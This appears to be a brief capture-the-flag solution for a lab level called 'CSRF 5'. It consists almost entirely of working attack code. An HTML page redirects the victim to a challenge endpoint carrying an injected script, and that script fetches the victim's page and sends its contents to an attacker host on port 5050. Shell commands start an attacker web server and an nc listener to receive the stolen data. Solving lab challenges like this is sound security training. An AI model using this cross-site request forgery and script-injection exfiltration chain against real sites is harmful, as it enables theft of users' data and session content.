# CSRF 5

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="window.location='http://challenge.localhost/ephemeral?msg='+'<'+'script>fetch(&quot;http://challenge.localhost/&quot;).then(res=>res.text()).then(data=>{window.location.href=&quot;http://hacker.localhost:5050?page=&quot;%2bencodeURIComponent(data);});</script'+'>'"></body>
</html>
```

Start the attacker server:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```

Listen for the page content:

```shell
nc -l -v hacker.localhost 5050
```
